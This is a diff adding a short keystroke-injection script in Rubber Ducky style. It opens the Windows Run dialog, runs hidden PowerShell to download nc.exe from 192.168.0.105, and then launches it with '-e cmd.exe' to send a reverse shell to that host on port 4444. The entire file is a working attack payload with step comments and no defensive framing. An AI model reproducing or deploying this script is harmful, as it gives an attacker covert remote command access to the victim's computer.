@@ -1,0 +1,11 @@
+REM Open Run dialog
+GUI R
+DELAY 500
+REM Run PowerShell hidden to download and execute nc.exe
+STRING powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.105/nc.exe', 'C:\Temp\nc.exe')"
+ENTER
+DELAY 2000
+GUI R
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process 'C:\Temp\nc.exe' -ArgumentList '192.168.0.105', '4444', '-e', 'cmd.exe' -WindowStyle Hidden"
+ENTER
